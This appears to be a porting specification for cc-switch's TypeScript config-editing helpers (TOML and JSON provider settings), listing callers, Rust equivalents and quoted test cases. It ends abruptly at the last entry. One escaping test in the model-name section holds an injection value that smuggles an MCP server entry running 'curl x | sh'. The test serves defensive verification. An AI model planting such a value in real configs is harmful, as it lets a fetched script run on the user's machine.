# Port spec: frontend config manipulation → Rust backend

All paths absolute. Line numbers from current working tree.

---

# 1. `/home/user/cc-switch/src/utils/textNormalization.ts` (2 exports)

### `normalizeQuotes(text: string): string` — L7-16
Replaces CJK/fullwidth/curly quotes with ASCII so TOML parses. Double-quote family `[“”„‟＂]` → `"`; single-quote family `[‘’＇]` → `'`. Empty/falsy input is returned as-is (early `if (!text) return text`). Deliberately does NOT touch 《》「」 etc.
**Callers:** none directly outside this file (only `normalizeTomlText`).

### `normalizeTomlText(text: string): string` — L21-22
Currently an alias of `normalizeQuotes`; documented as the extension point for future whitespace/EOL normalization. Note it does **not** normalize CRLF today — a port must keep that behavior or all the line-index math below shifts.
**Callers:** `/home/user/cc-switch/src/utils/providerConfigUtils.ts`, `/home/user/cc-switch/src/utils/tomlUtils.ts`, `/home/user/cc-switch/src/components/providers/forms/hooks/useCodexConfigState.ts`, `/home/user/cc-switch/src/components/providers/forms/hooks/useCodexCommonConfig.ts`, `/home/user/cc-switch/src/components/mcp/McpFormModal.tsx`.
**No dedicated unit test file.**

---

# 2. `/home/user/cc-switch/src/utils/providerConfigUtils.ts` (28 exports = 27 fns + 1 interface)

## Shared internals a port must replicate (not exported)
- `isPlainObject` (L9), `deepMerge` (L13) — recurses into plain objects, **overwrites** arrays/scalars wholesale.
- `deepRemove` (L31) — only removes a key when `isSubset(target[key], source[key])`; prunes nested objects that become empty.
- `isSubset` (L51) — objects: recursive key-wise; arrays: **same length + index-wise** (unlike the Rust `json_is_subset`, which does order-insensitive matching, see §8).
- `finalizeTomlText(lines)` (L418) — `lines.join("\n")`, collapse `\n{3,}` → `\n\n`, strip leading newlines. Every TOML mutator returns through this.
- `getTomlSectionRange` (L424) — finds `[section]` header by exact bracket content, body runs to the **next** header or EOF.
- `getTopLevelEndIndex` (L461) — index of first `[...]` header, else `lines.length`.
- `getTomlSectionInsertIndex` (L468) — end of section body, backing up over trailing blank lines.
- `escapeTomlBasicString` (L669) / `tomlBasicString` (L676) — escapes `"` `\` `\b \t \n \f \r`, other C0 → `\uXXXX`.
- `unescapeTomlBasicString` (L690) — inverse; `\uXXXX`/`\UXXXXXXXX` decoded; **unknown escapes preserved verbatim**.
- `CODEX_RESERVED_MODEL_PROVIDER_IDS` (L397) = `amazon-bedrock, openai, ollama, lmstudio, oss, ollama-chat` (identical to Rust `CODEX_RESERVED_MODEL_PROVIDER_IDS`, `/home/user/cc-switch/src-tauri/src/codex_config.rs:148`).
- Regexes are **strict whole-line** matches allowing a trailing `# comment` (L371-396). Multi-line strings that "look like" assignments are intentionally not matched.
- Section resolution: `getCodexModelProviderName` (L482) parses with smol-toml, falls back to a **top-level-only** line scan of `model_provider` when the TOML is mid-edit/invalid. `getCodexProviderSectionName` → `model_providers.<id>`; `getCodexCustomProviderSectionName` (L515) additionally requires the id to be non-reserved.
- `getRecoverableBaseUrlAssignments` (L626) — "misplaced" assignments eligible for recovery: any section that is not the target section, not `mcp_servers[.*]`, and not another `model_providers[.*]`.

## 2.1 `interface UpdateCommonConfigResult` — L67
`{ updatedConfig: string; error?: string }`.

## 2.2 `validateJsonConfig(value: string, fieldName = "配置"): string` — L73
Returns `""` on success. Empty/whitespace-only input → `""` (valid). Non-object or array parse result → `` `${fieldName}必须是 JSON 对象` ``. Parse throw → `` `${fieldName}JSON格式错误，请检查语法` ``.
**Callers:** `src/components/providers/forms/hooks/useCommonConfigSnippet.ts`, `src/components/mcp/useMcpValidation.ts`, `src/components/mcp/McpFormModal.tsx`, `tests/hooks/useMcpValidation.test.tsx`.

## 2.3 `updateCommonConfigSnippet(jsonString, snippetString, enabled: boolean): UpdateCommonConfigResult` — L92
Parses `jsonString` (empty → `{}`); on parse failure returns the **original string untouched** plus error `"配置 JSON 解析失败，无法应用通用配置"`. Blank snippet → re-serialized config, no error. Invalid snippet → re-serialized config + the `validateJsonConfig(..., "通用配置片段")` message. `enabled=true` → `deepMerge(deepClone(config), snippet)`; `false` → `deepRemove` on a clone. Output always `JSON.stringify(x, null, 2)` (2-space, key order = insertion order; comments N/A for JSON).
**Callers:** `src/components/providers/forms/hooks/useCommonConfigSnippet.ts`.

## 2.4 `hasCommonConfigSnippet(jsonString, snippetString): boolean` — L139
Blank snippet → `false`. Snippet not a plain object → `false`. Any JSON parse throw → `false`. Otherwise `isSubset(config, snippet)`.
**Callers:** `src/components/providers/forms/hooks/useCommonConfigSnippet.ts`.

## 2.5 `getApiKeyFromConfig(jsonString, appType?): string` — L155
Precedence: top-level `config.apiKey` if it is a non-empty string **not containing `${`** (template placeholder guard, for Bedrock presets) → returned. Then `config.env`; missing → `""`. `appType==="gemini"` → `env.GEMINI_API_KEY`; `"codex"` → `env.CODEX_API_KEY`; otherwise Claude: `ANTHROPIC_AUTH_TOKEN` preferred, else `ANTHROPIC_API_KEY`. Non-string values and any throw → `""`.
**Callers:** `src/components/providers/forms/hooks/useApiKeyState.ts`.

## 2.6 `applyTemplateValues(config: any, templateValues: Record<string, TemplateValueConfig> | undefined): any` — L203
Resolves each variable to `editorValue ?? defaultValue ?? ""` (`editorValue !== undefined` wins, so `""` is a valid override). Deep-traverses strings/arrays/objects producing a **new** structure; scalars pass through. Replaces every occurrence of `${key}` by `split/join` (literal, not regex — no escaping issues). Missing placeholder → string returned unchanged (fast path).
**Callers:** `src/components/providers/forms/hooks/useTemplateValues.ts`, `src/components/providers/forms/ProviderForm.tsx`.

## 2.7 `hasApiKeyField(jsonString, appType?): boolean` — L248
`hasOwnProperty("apiKey")` on the root → `true` (even if value is empty/null). Else checks `env` (defaults `{}`) for `GEMINI_API_KEY` / `CODEX_API_KEY` / (`ANTHROPIC_AUTH_TOKEN` || `ANTHROPIC_API_KEY`). Throw → `false`.
**Callers:** `src/components/providers/forms/hooks/useApiKeyState.ts`, `src/components/providers/forms/ProviderForm.tsx`.

## 2.8 `setApiKeyInConfig(jsonString, apiKey, options?: { createIfMissing?: boolean; appType?: string; apiKeyField?: string }): string` — L280
Default `createIfMissing=false` → **never creates missing fields**, returns the input string verbatim instead (important: returns the *original* text, not a reformatted one). Root `apiKey` present → set and return pretty JSON. Missing `env` + `!createIfMissing` → original string. Gemini/Codex: set existing key, or create when allowed, else return original. Claude: overwrite `ANTHROPIC_AUTH_TOKEN` if present, else `ANTHROPIC_API_KEY` if present, else (when creating) `options.apiKeyField ?? "ANTHROPIC_AUTH_TOKEN"`. Any throw → original string.
**Callers:** `src/components/providers/forms/hooks/useApiKeyState.ts`.

## 2.9 `hasTomlCommonConfigSnippet(tomlString, snippetString): boolean` — L352
Blank snippet → `false`. Parses both (after `normalizeTomlText`) with smol-toml and returns `isSubset`. **On any parse error falls back to fuzzy text containment**: `s.replace(/\s+/g," ").trim()` on both, then `includes`.
Note the explicit comment at L347-349: snippet merge/strip must go through the backend `configApi.updateTomlCommonConfigSnippet` (toml_edit) — parse→merge→stringify in JS destroys comments and key order.
**Callers:** `src/components/providers/forms/hooks/useCodexCommonConfig.ts`.

## 2.10 `isCodexChatWireApi(wireApi: string | undefined | null): boolean` — L709
Trim + lowercase, membership in `{chat, chat_completions, chat-completions, openai_chat, openai-chat, openai_chat_completions}`. Null/undefined → `false`.
**Callers:** `src/components/providers/ProviderCard.tsx`, `src/hooks/useProviderActions.ts`.
**Backend equivalent already exists:** `is_chat_wire_api` (private) `/home/user/cc-switch/src-tauri/src/proxy/providers/codex.rs:498` — identical alias set.

## 2.11 `isCodexAnthropicWireApi(wireApi): boolean` — L714
Same shape, set `{anthropic, anthropic_messages, anthropic-messages, messages, claude}`.
**Callers:** `src/components/providers/ProviderCard.tsx`, `src/hooks/useProviderActions.ts`, `src/utils/providerConfigUtils.test.ts`.
**Backend equivalent:** `is_anthropic_wire_api` (private) `src-tauri/src/proxy/providers/codex.rs:510` — identical set.
**Tests** (`src/utils/providerConfigUtils.test.ts:12-18`):
```
isCodexAnthropicWireApi("anthropic")          -> true
isCodexAnthropicWireApi("anthropic_messages") -> true
isCodexAnthropicWireApi("messages")           -> true
isCodexAnthropicWireApi("claude")             -> true
isCodexAnthropicWireApi("responses")          -> false
```

## 2.12 `codexApiFormatFromWireApi(wireApi): CodexApiFormat | undefined` — L725
Chat aliases → `"openai_chat"`; Anthropic aliases → `"anthropic"`; `responses|openai_responses|openai-responses` → `"openai_responses"`; anything else (incl. null) → `undefined`.
**Callers:** `src/components/providers/forms/GrokBuildProviderForm.tsx`, `src/components/providers/forms/ProviderForm.tsx`, test.
**Tests** (`src/utils/providerConfigUtils.test.ts:20-32`):
```
for each of ["anthropic","anthropic_messages","anthropic-messages","messages","claude"] -> "anthropic"
codexApiFormatFromWireApi("responses")        -> "openai_responses"
codexApiFormatFromWireApi("chat_completions") -> "openai_chat"
```
**Backend partial equivalent:** `CodexCatalogToolProfile::from_api_format(Option<&str>) -> Self` `src-tauri/src/codex_config.rs:134` (maps the *format* string, not the wire_api alias) and `resolve_codex_catalog_tool_profile(&Provider)` `src-tauri/src/proxy/providers/codex.rs:224`.

## 2.13 `extractCodexWireApi(configText: string | undefined | null): string | undefined` — L741
Normalizes; empty → `undefined`. Search order: (1) `wire_api` inside `[model_providers.<active>]`; (2) first top-level `wire_api` (above the first section header); (3) **recovery**: all `wire_api` assignments filtered by `getRecoverableCodexProviderAssignments` — returns the value only if exactly one candidate remains, else `undefined`. Any throw → `undefined`. Accepts single or double quotes; value must be non-empty (regex requires `[^"'\r\n]+`).
**Callers:** `src/components/providers/ProviderCard.tsx`, `src/components/providers/forms/GrokBuildProviderForm.tsx`, `src/components/providers/forms/ProviderForm.tsx`, `src/hooks/useProviderActions.ts`, `tests/config/codexChatProviderPresets.test.ts`.
**Backend equivalent:** `extract_codex_wire_api_from_toml(config_text: &str) -> Option<String>` (private) `src-tauri/src/proxy/providers/codex.rs:534` — active-provider then top-level; **no recovery pass**.

## 2.14 `setCodexWireApi(configText: string, wireApi: "responses" | "chat"): string` — L791
Writes `wire_api = "<value>"` (always double-quoted, value is a closed union so no escaping). If an active provider section is resolvable: replace in-section if present; else if exactly one recoverable misplaced assignment exists, delete it first (and re-resolve the section range); else append at section end (before trailing blanks); if the section doesn't exist, append `[<section>]` + the line at EOF, inserting a blank separator first. Without a provider section: replace the top-level occurrence, else insert right after the top-level `model_provider` line, else (empty doc) return `` `wire_api = "x"\n` ``, else insert at `topLevelEndIndex`. Note **replacement rewrites the whole line**, so any trailing comment on that line is lost (unlike the bearer-token setter).
**Callers:** `src/components/providers/forms/ProviderForm.tsx`.
**Backend equivalent:** `update_codex_toml_field(toml_str, "wire_api", value)` `src-tauri/src/codex_config.rs:1809` (see §8).

## 2.15 `isCodexGoalModeEnabled(configText: string | undefined | null): boolean` — L866
Empty → `false`. Prefers smol-toml parse → `parsed.features?.goals === true`. On parse failure falls back to scanning the `[features]` section for `goals = true|false`. Missing section/key → `false`.
**Callers:** `src/components/providers/forms/CodexConfigSections.tsx`, `tests/components/CommonConfigModalBehavior.test.tsx`, `tests/utils/providerConfigUtils.codex.test.ts`.

## 2.16 `setCodexGoalMode(configText: string, enabled: boolean): string` — L899
If `[features]` exists: enabling → replace an existing `goals = true|false` **preserving leading whitespace and trailing comment** (`"$1true$3"`), else insert `goals = true` at the section's insert index. Disabling → delete the `goals` line, then if the section body has no remaining non-blank line, delete the whole section header+body. If `[features]` is absent and `enabled=false` → return the normalized text unchanged. If absent and enabling → insert `[features]\ngoals = true` at `topLevelEndIndex`, adding a blank line before (if the preceding top-level line isn't blank) and after (if the following line isn't blank).
**Callers:** `src/components/providers/forms/CodexConfigSections.tsx`, `tests/utils/providerConfigUtils.codex.test.ts`.
**Tests** (`/home/user/cc-switch/tests/utils/providerConfigUtils.codex.test.ts:242-317`):
```
// insert
input:  'model_provider = "custom"\nmodel = "gpt-5.4"\n\n[model_providers.custom]\nname = "custom"\n'
setCodexGoalMode(input, true) contains
        'model = "gpt-5.4"\n\n[features]\ngoals = true\n\n[model_providers.custom]'
        isCodexGoalModeEnabled(output) -> true

// remove, keeping sibling flags
input:  'model_provider = "custom"\n\n[features]\ngoals = true\nexperimental_resume = true\n\n[model_providers.custom]\nname = "custom"\n'
setCodexGoalMode(input, false) contains '[features]\nexperimental_resume = true'; no /^\s*goals\s*=/m

// remove whole table when goals was the only flag
input:  'model_provider = "custom"\n\n[features]\ngoals = true\n\n[model_providers.custom]\nname = "custom"\n'
output does NOT contain '[features]'; still contains '[model_providers.custom]'

// comments in the features table survive
input:  'model_provider = "custom"\n\n[features]\n# Keep this note\ngoals = true\n\n[model_providers.custom]\nname = "custom"\n'
output contains '[features]\n# Keep this note'; no goals line  // section NOT deleted: comment counts as body content
```

## 2.17 `isCodexRemoteCompactionEnabled(configText): boolean` — L963
Remote compaction is encoded as: the **active, non-reserved** `model_provider`'s table has `name = "OpenAI"`. Empty → `false`. Reserved provider ids (`openai`, etc.) → `false` even if named OpenAI. Prefers smol-toml (`parsed.model_providers?.[id]?.name === "OpenAI"`), falls back to a section line scan. Any throw → `false`.
**Callers:** `src/components/providers/forms/CodexConfigSections.tsx`, `src/utils/providerConfigUtils.test.ts`.

## 2.18 `setCodexRemoteCompaction(configText: string, enabled: boolean, fallbackProviderName?: string): string` — L1007
No custom (non-reserved) active provider → returns normalized text unchanged. Replacement name = `"OpenAI"` when enabling, else `fallbackProviderName?.trim() || <active provider id> || "custom"`. If the section exists: rewrite the existing `name = ...` line preserving indentation and trailing comment (`$1<quoted>$2`), else insert `name = "<x>"` at section end. If the section doesn't exist and `enabled=false` → unchanged; if enabling → append `[<section>]` + name line (blank-line separated).
**Callers:** `src/components/providers/forms/CodexConfigSections.tsx`, `src/utils/providerConfigUtils.test.ts`.
**Tests** (`/home/user/cc-switch/src/utils/providerConfigUtils.test.ts:36-79`):
```
input:
model_provider = "custom"
model = "gpt-5.4"

[model_providers.custom]
name = "AIHubMix"
base_url = "https://aihubmix.example/v1"
wire_api = "responses"

[model_providers.backup]
name = "Backup"
base_url = "https://backup.example/v1"

setCodexRemoteCompaction(input, true, "AIHubMix"):
  isCodexRemoteCompactionEnabled(result) -> true
  result contains '[model_providers.custom]\nname = "OpenAI"'
  result contains '[model_providers.backup]\nname = "Backup"'   // other sections untouched

input: 'model_provider = "custom"\n\n[model_providers.custom]\nname = "OpenAI"\nbase_url = "https://aihubmix.example/v1"\nwire_api = "responses"\n'
setCodexRemoteCompaction(input, false, "AIHubMix") -> contains 'name = "AIHubMix"', enabled -> false

input: 'model_provider = "openai"\nmodel = "gpt-5"\n'
setCodexRemoteCompaction(input, true, "OpenAI") === input   // reserved id: no-op
isCodexRemoteCompactionEnabled(input) -> false
```

## 2.19 `extractCodexBaseUrl(configText: string | undefined | null): string | undefined` — L1064
Same three-tier strategy as `extractCodexWireApi`: active `[model_providers.<id>].base_url` → top-level `base_url` → exactly-one recoverable misplaced assignment (excludes `mcp_servers.*` and other `model_providers.*`). Supports `"..."` (with escapes) and `'...'`; **the returned double-quoted value is NOT unescaped** (unlike model name). Empty/throw → `undefined`.
**Callers:** `src/components/providers/AddProviderDialog.tsx`, `src/components/providers/ProviderCard.tsx`, `src/components/providers/forms/GrokBuildProviderForm.tsx`, `src/components/providers/forms/hooks/useSpeedTestEndpoints.ts`, `src/components/providers/forms/hooks/useCodexConfigState.ts`, `src/components/providers/forms/hooks/useBaseUrlState.ts`, `src/components/UsageScriptModal.tsx`, `tests/config/codexChatProviderPresets.test.ts`, `tests/utils/providerConfigUtils.codex.test.ts`.
**Backend equivalent (reuse this):** `pub fn extract_codex_base_url(config_text: &str) -> Option<String>` `src-tauri/src/codex_config.rs:342` — active provider then top-level, explicitly documented as mirroring the frontend; **lacks the single-misplaced-assignment recovery** the frontend has.

## 2.20 `extractCodexExperimentalBearerToken(configText): string | undefined` — L1114
Prefers smol-toml: active **custom** provider's `experimental_bearer_token` (trimmed, non-empty) → top-level token. Falls back to line scanning the custom-provider section, then top level. Reserved provider tables (e.g. `[model_providers.openai]`) are deliberately ignored. Only top-level `model_provider` counts (a `model_provider` inside `[profiles.*]` must not redirect the lookup). Empty/throw → `undefined`.
**Callers:** `src/components/providers/ProviderCard.tsx`, `src/components/providers/forms/hooks/useCodexConfigState.ts`, `src/components/UsageScriptModal.tsx`, `tests/utils/providerConfigUtils.codex.test.ts`.
**Backend equivalent (reuse):** `pub fn extract_codex_experimental_bearer_token(config_text: &str) -> Option<String>` `src-tauri/src/codex_config.rs:1221` — same semantics incl. reserved-id and top-level fallback, with a fast `contains("experimental_bearer_token")` bail-out.
**Tests** (`tests/utils/providerConfigUtils.codex.test.ts:422-448`):
```
'model_provider = "openai"\nexperimental_bearer_token = "top-level-key"\n\n[model_providers.openai]\nexperimental_bearer_token = "stale-table-key"\n'
  -> "top-level-key"
'experimental_bearer_token = "top-level-key"\n\n[profiles.work]\nmodel_provider = "fake"\n\n[model_providers.fake]\nexperimental_bearer_token = "wrong-key"\n'
  -> "top-level-key"
```

## 2.21 `updateCodexExperimentalBearerToken(configText: string, token: string): string` — L1183
**Never creates the field.** If the normalized text is empty or does not contain the substring `experimental_bearer_token`, the **original (non-normalized) `configText`** is returned. Locates the line in the active custom provider section first, then top level; if neither matches the strict replace regex → returns original `configText`. Empty/whitespace `token` → the line is deleted. Otherwise the value is replaced in place via `$1"<escaped>"$2`, **preserving indentation and any trailing comment**; escaping uses `escapeTomlBasicString` (`"`→`\"`, `\`→`\\`, C0 → `\uXXXX`).
**Callers:** `src/components/providers/forms/hooks/useCodexConfigState.ts`, `tests/utils/providerConfigUtils.codex.test.ts`.
**Backend equivalents:** `set_codex_experimental_bearer_token(config_text, token) -> Result<String, AppError>` (private) `src-tauri/src/codex_config.rs:1251` — **differs: it DOES create the key** (top-level or in the provider table) and errors `provider.codex.config.missing` on empty config; `remove_codex_experimental_bearer_token_if(config_text, predicate) -> Result<String, AppError>` `codex_config.rs:1293`; `remove_codex_experimental_bearer_token` (private) `codex_config.rs:1334`.
**Tests** (`tests/utils/providerConfigUtils.codex.test.ts:319-420`):
```
// never add the line
input = 'model_provider = "openai"\nbase_url = "https://api.example.com/v1"\n'
update(input, "new-key") === input ; update(input, "") === input

// empty token erases the line, siblings intact
input = 'model_provider = "thirdparty"\n\n[model_providers.thirdparty]\nname = "Thirdparty"\nbase_url = "https://thirdparty.example/v1"\nexperimental_bearer_token = "old-key"\nrequires_openai_auth = true\n'
update(input, "")  -> extract(...) === undefined; still matches /requires_openai_auth = true/ and base_url line

// in-section replacement
input = 'model_provider = "thirdparty"\n\n[model_providers.thirdparty]\nexperimental_bearer_token = "old-key"\n'
update(input, "new-key") -> extract === "new-key"; no "old-key"

// escaping + trailing comment preserved
input line: 'experimental_bearer_token = "old-key" # vendor token'
update(input, 'abc"def\ghi') contains 'experimental_bearer_token = "abc\"def\\ghi" # vendor token'
                              extract(updated) === 'abc"def\ghi'

// control chars
update(input, "a bcd") contains 'experimental_bearer_token = "a bcd"' (backslash-u literals)
                              round-trips back to "a bcd"

// replacing an already-escaped value
input line: 'experimental_bearer_token = "old\"key" # vendor token'
update(input, "new-key") contains 'experimental_bearer_token = "new-key" # vendor token'
```

## 2.22 `getCodexBaseUrl(provider: { settingsConfig?: Record<string, any> } | null | undefined): string | undefined` — L1242
Thin adapter: reads `provider.settingsConfig.config` when it is a string (else `""`) and delegates to `extractCodexBaseUrl`. Throw → `undefined`.
**Callers: NONE** (dead export — do not port unless wanted).

## 2.23 `setCodexBaseUrl(configText: string, baseUrl: string): string` — L1257
**Empty/whitespace `baseUrl` = delete.** Deletion path: empty doc → return as-is; delete **all** `base_url` lines inside the active provider section if any; else delete the single recoverable misplaced assignment if exactly one; else no-op. Write path: value is trimmed then **all internal whitespace is stripped** (`replace(/\s+/g,"")`), then written as `base_url = <tomlBasicString(url)>` (always double-quoted + escaped). In the provider section: first match is replaced and **duplicates removed** (reverse-splice); if no match but exactly one recoverable misplaced assignment exists, it is deleted and the range re-resolved; then insert at section end; if the section is missing, append `[<section>]` + line. Without a provider section: replace first top-level match (removing duplicates), else insert after the top-level `model_provider` line, else empty doc → `` `base_url = "..."\n` ``, else insert at `topLevelEndIndex`.
**Callers:** `src/components/providers/forms/hooks/useCodexConfigState.ts`, `src/components/providers/forms/hooks/useBaseUrlState.ts`, `tests/utils/providerConfigUtils.codex.test.ts`.
**Backend equivalents:** `update_codex_toml_field(toml_str, "base_url", value)` `src-tauri/src/codex_config.rs:1809` (empty value removes) and `remove_codex_toml_base_url_if(toml_str, predicate) -> String` `codex_config.rs:1869`.
**Tests** (`tests/utils/providerConfigUtils.codex.test.ts:17-199`):
```
// clear
input = 'model_provider = "openai"\nbase_url = "https://api.example.com/v1"\nmodel = "gpt-5-codex"\n'
setCodexBaseUrl(input, "") -> no /^\s*base_url\s*=/m ; extractCodexBaseUrl -> undefined ; model still "gpt-5-codex"

// whitespace-stripping update over a single-quoted value
input = 'model_provider = "openai"\nbase_url = \'https://old.example/v1\'\nmodel = "old-model"\n'
setCodexBaseUrl(input, " https://new.example/v1 \n") -> extract === "https://new.example/v1"

// double-quoted value containing single quotes, no duplication
[model_providers.custom] with  base_url = "https://su'us.codes/v1"
setCodexBaseUrl(input, "https://su'us'd.codes/v1")
  extract -> "https://su'us'd.codes/v1" ; exactly 1 base_url line ; contains base_url = "https://su'us'd.codes/v1"

// duplicate collapse inside the active section
section has base_url = "https://old.example/v1" AND base_url = "https://older.example/v1"
setCodexBaseUrl(input, "https://new.example/v1") -> 1 base_url line, contains new, not "older.example"

// insert into the active section
'model_provider = "custom"\nmodel = "gpt-5.4"\n\n[model_providers.custom]\nname = "custom"\nwire_api = "responses"\n\n[profiles.default]\napproval_policy = "never"\n'
setCodexBaseUrl(input, "https://api.example.com/v1") contains
'[model_providers.custom]\nname = "custom"\nwire_api = "responses"\nbase_url = "https://api.example.com/v1"'

// recovery of one misplaced base_url from [profiles.default]
extractCodexBaseUrl(input) -> "https://wrong.example/v1"
setCodexBaseUrl(input, "https://fixed.example/v1") -> moved into [model_providers.custom]; wrong.example gone; exactly 1 base_url

// mcp_servers is never treated as the provider base_url
config with [model_providers.azure] (no base_url) + [mcp_servers.my_server] base_url = "http://localhost:8080"
extractCodexBaseUrl(input) -> undefined
setCodexBaseUrl(input, "https://new.azure/v1") -> writes into [model_providers.azure]; mcp_servers line preserved

// single-quoted top-level
"base_url = 'https://api.example.com/v1'\nmodel = 'gpt-5'\n" -> extract base_url "https://api.example.com/v1", model "gpt-5"
```

## 2.24 `extractCodexModelName(configText): string | undefined` — L1395
**Top-level only** — scans `[0, topLevelEndIndex)`; `model` keys inside any section are ignored. Double-quoted match is unescaped with `unescapeTomlBasicString` (round-trips `setCodexModelName`); single-quoted (literal) returned raw. `model = ""` yields `""` (an empty string, not `undefined`). Empty input/throw → `undefined`.
**Callers:** `src/components/providers/forms/GrokBuildProviderForm.tsx`, `src/components/providers/forms/hooks/useCodexConfigState.ts`, `src/components/providers/forms/ProviderForm.tsx`, both test files, `tests/config/codexChatProviderPresets.test.ts`.
**Backend equivalents:** `codex_top_level_model(config_text) -> Option<String>` (private) `src-tauri/src/codex_config.rs:67` (trims, filters empty) and `extract_codex_model_from_toml` (private) `src-tauri/src/proxy/providers/codex.rs:~558`.

## 2.25 `setCodexModelName(configText: string, modelName: string): string` — L1417
Empty/whitespace `modelName` deletes the first top-level model line (empty doc → returned unchanged). Otherwise writes `model = <tomlBasicString(trimmed)>` — **escaping is a security requirement**: model ids come from remote `/models` responses and a raw interpolation could inject `[mcp_servers.*]` lines. Replaces the first top-level `model` line (double- or single-quoted, incl. `model = ""`), else inserts right after the top-level `model_provider` line, else on an empty doc returns `` `model = "x"\n` ``, else inserts at `topLevelEndIndex`.
**Callers:** `src/components/providers/forms/hooks/useCodexConfigState.ts`, `src/components/providers/forms/ProviderForm.tsx`, both test files.
**Backend equivalent:** `update_codex_toml_field(toml_str, "model", value)` `src-tauri/src/codex_config.rs:1809`.
**Tests** (`src/utils/providerConfigUtils.test.ts:82-175`), shared `input`:
```
# user comment
model_provider = "custom"
model = "gpt-5.5"
model_reasoning_effort = "high"

[model_providers.custom]
name = "Example"
base_url = "https://example.com/v1"
```
```
extractCodexModelName(input) -> "gpt-5.5"
extractCodexModelName('[profiles.fast]\nmodel = "gpt-5.5-mini"\n') -> undefined
setCodexModelName(input, "gpt-5.6") -> extract "gpt-5.6"; still contains "# user comment" and model_reasoning_effort = "high"; no "gpt-5.5"
setCodexModelName('model_provider = "custom"\n\n[model_providers.custom]\nname = "Example"\n', "gpt-5.6") -> extract "gpt-5.6"
setCodexModelName(input, "") -> extract undefined; still contains 'model_provider = "custom"'
setCodexModelName(input, 'evil"\n[mcp_servers.pwn]\ncommand = "curl x | sh')
    -> contains 'model = "evil\"\n[mcp_servers.pwn]\ncommand = \"curl x | sh"' (literal backslash escapes)
    -> no line matching /^\[mcp_servers\.pwn\]$/m or /^command = /m ; exactly one line starting with 'model = '
setCodexModelName(input, "vendor\\model") -> contains 'model = "vendor\\\\model"'  (i.e. TOML text: model = "vendor\\model")
round-trip: name = 'a"b\c' ; extractCodexModelName(setCodexModelName(input, name)) === name
setCodexModelName(setCodexModelName(input, 'evil"name'), "gpt-5.6") -> exactly one 'model = ' line, extract "gpt-5.6"
extractCodexModelName('model_provider = "custom"\nmodel = ""\n') -> ""  (then replaceable; still 1 model line)
extractCodexModelName("model = 'kimi-k2.7'\n") -> "kimi-k2.7"
```
And (`tests/utils/providerConfigUtils.codex.test.ts:32-49, 182-199`):
```
input = 'model_provider = "openai"\nbase_url = "https://api.example.com/v1"\nmodel = "gpt-5-codex"\n\n[profiles.default]\nmodel = "profile-model"\n'
setCodexModelName(input, "") -> no /^model\s*=\s*"gpt-5-codex"$/m ; still matches /^\[profiles\.default\]\nmodel = "profile-model"$/m
                                extractCodexModelName -> undefined ; extractCodexBaseUrl -> "https://api.example.com/v1"
setCodexModelName(output1, " new-model \n") -> extract "new-model"   // trims
extractCodexModelName('model_provider = "custom"\n\n[profiles.default]\nmodel = "profile-model"\n') -> undefined
```

## 2.26 `extractCodexTopLevelInt(configText, fieldName: string): number | undefined` — L1478
Builds `^\s*<fieldName>\s*=\s*(\d+)\s*(?:#.*)?$` dynamically (**fieldName is interpolated unescaped into a RegExp** — a port should treat it as a plain key). Scans the top-level region only, returns the first match as `Number`. Only non-negative decimal integers match (no `+`/`-`, no `_` separators, no hex). Empty/throw → `undefined`.
**Callers:** `src/components/providers/forms/CodexConfigSections.tsx`, `tests/utils/providerConfigUtils.codex.test.ts`. Real fields: `model_context_window`, `model_auto_compact_token_limit`.
**Backend equivalent:** `extract_codex_top_level_u64(config_text, field) -> Option<u64>` (private) `src-tauri/src/codex_config.rs:433` — parses with `toml::Value`, requires `> 0`; also `parse_codex_positive_u64` `codex_config.rs:425`.

## 2.27 `setCodexTopLevelInt(configText, fieldName, value: number): string` — L1495
Replaces the existing top-level line with `<field> = <value>` (whole-line rewrite → any trailing comment on that line is lost), else appends at `topLevelEndIndex` (before the first section header); on an empty doc returns `` `<field> = <value>\n` ``.
**Callers:** `src/components/providers/forms/CodexConfigSections.tsx`, `tests/utils/providerConfigUtils.codex.test.ts`.

## 2.28 `removeCodexTopLevelField(configText, fieldName): string` — L1521
Empty doc → unchanged. Deletes the first matching top-level **integer** line for that field (uses the same int regex — a non-integer value is not removed). Returns through `finalizeTomlText`.
**Callers:** `src/components/providers/forms/CodexConfigSections.tsx`, `tests/utils/providerConfigUtils.codex.test.ts`.
**Tests for 2.26-2.28** (`tests/utils/providerConfigUtils.codex.test.ts:201-240`):
```
input = 'model_provider = "custom"\nmodel = "deepseek-v4-flash"\n\n[model_providers.custom]\nname = "DeepSeek"\n'
withContext = setCodexTopLevelInt(input, "model_context_window", 128000)
withCompact = setCodexTopLevelInt(withContext, "model_auto_compact_token_limit", 90000)
extractCodexTopLevelInt(withCompact, "model_context_window")           -> 128000
extractCodexTopLevelInt(withCompact, "model_auto_compact_token_limit") -> 90000
withCompact matches /^model_context_window = 128000$/m and /^model_auto_compact_token_limit = 90000$/m
removed = removeCodexTopLevelField(withCompact, "model_context_window")
extractCodexTopLevelInt(removed, "model_context_window") -> undefined ; removed still contains "[model_providers.custom]"
```

---

# 3. `/home/user/cc-switch/src/utils/tomlUtils.ts` (4 exports)

### `validateToml(text: string): string` — L10
Returns `""` for blank input and for a valid TOML table. Non-object/array parse result → `"mustBeObject"` (an i18n key, wrapped upstream). Parse throw → the **raw smol-toml error message**, or `"parseError"` if the error has no message. Normalizes quotes before parsing.
**Callers:** `src/components/providers/forms/hooks/useCodexTomlValidation.ts`, `src/components/mcp/useMcpValidation.ts`, `src/lib/schemas/common.ts`, `tests/hooks/useMcpValidation.test.tsx`.
**Backend equivalents:** `codex_config::validate_config_toml(text) -> Result<(), AppError>` `src-tauri/src/codex_config.rs:271` (blank → Ok); `commands/config.rs:32 invalid_toml_format_error(toml_edit::TomlError) -> String`; `commands/config.rs:44 validate_common_config_snippet(app_type, snippet) -> Result<(), String>` (comment-only Codex snippets are valid).

### `mcpServerToToml(server: McpServerSpec): string` — L30
Shallow-copies the spec, deletes `undefined`-valued keys, `stringifyToml`, `.trim()`. Extension fields (e.g. `timeout_ms`) are preserved; escaping/nested tables handled by the serializer. No comment preservation (generated text).
**Callers:** `src/components/mcp/McpFormModal.tsx`.

### `tomlToMcpServer(tomlText: string): McpServerSpec` — L53 (throws)
